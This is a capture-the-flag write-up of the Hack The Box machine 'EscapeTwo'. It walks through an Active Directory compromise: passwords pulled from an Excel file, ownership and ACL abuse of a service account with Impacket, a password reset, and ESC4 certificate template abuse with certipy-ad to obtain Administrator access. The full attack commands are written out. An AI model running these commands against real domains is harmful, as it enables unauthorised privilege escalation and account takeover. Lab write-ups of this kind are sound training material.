---
title: EscapeTwo
date: 2025-01-21
description: Active Directory compromise on a Windows target involving SMB share enumeration, credential extraction from a corrupted Excel archive, ACL abuse against `ca_svc`, and AD CS template exploitation to obtain Administrator access.
tags:
  - htb
  - Medium
  - Windows
---

> Initial credentials for the target: `rose : KxEPkKe6R8su`

# Initial Recon

Open ports:
```
- SMB
- MS-SQL
- WinRM
```

`nmap` revealed the hostname as **`sequel.htb`**.

Added the domain to `/etc/hosts` and enumerated SMB shares using the `rose` account.

A readable share named **Administrator Accounting** stood out. Two files were pulled from it, including `accounts.xlsx`.

The Excel file appeared corrupted at first glance. Turns out it was just hiding behind the usual Office nonsense.

# User

> **NOTE:** Every `.xlsx` file is essentially a ZIP archive.

```bash
unzip accounts.xlsx -d accounts
```

Extracted the archive contents and located:

```text
accounts/
└── xl/
    └── sharedStrings.xml
```

The `sharedStrings.xml` file exposed usernames and passwords for MS-SQL. Instead of manually parsing raw XML like a cave goblin, the contents were cleaned up through an AI formatter for readability.

Leveraged the recovered `ryan` credentials to authenticate through `evil-winrm` and captured `user.txt`.

# Root

Uploaded `PowerView.ps1` and initially attempted to abuse ownership permissions against `ca_svc` through BloodHound-recommended commands. That route failed after the machine reset permissions mid-way.

The ACL reset occurs every few minutes, so timing matters here.

Ownership was reassigned using Impacket:

```bash
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

This transferred ownership of `ca_svc` to `ryan`.

Next, full control permissions were granted:

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

This provided `ryan` with full control over the `ca_svc` account.

The password was then reset remotely using `net rpc`:

```bash
net rpc password "ca_svc" 'Password123!' -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "sequel.htb"
```

With control over `ca_svc`, `certipy-ad` was used to enumerate vulnerable certificate templates:

```bash
certipy-ad find -u ca_svc@sequel.htb -p 'Password123!' -dc-ip 10.10.11.51 -vulnerable -enabled
```

The output identified a vulnerable template:

```text
CA Name                             : sequel-DC01-CA
DNS Name                            : DC01.sequel.htb
Template Name                       : DunderMifflinAuthentication
[!] Vulnerabilities ESC4 :'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

Attempted to request a certificate using the vulnerable template:

```bash
certipy-ad req -username ryan@sequel.htb -p WqSZAF6CysDQbGb3 -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn Administrator@sequel.htb -dc-ip 10.10.11.51
```

The request failed because the template configuration required modification first.

Updated the template:

```bash
certipy-ad template -u ca_svc -p Password123! -template DunderMifflinAuthentication -save-old -dc-ip 10.10.11.51
```

After updating the template, the certificate request succeeded:

```bash
certipy-ad req -username ryan@sequel.htb -p WqSZAF6CysDQbGb3 -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn Administrator@sequel.htb -dc-ip 10.10.11.51
```

The certificate was saved as a `.pfx` file.

Authenticated using the generated certificate and extracted the Administrator hash:

```bash
certipy-ad auth -pfx administrator.pfx -username Administrator -domain sequel.htb
```

Used the recovered hash with `evil-winrm`.

Gained `Root`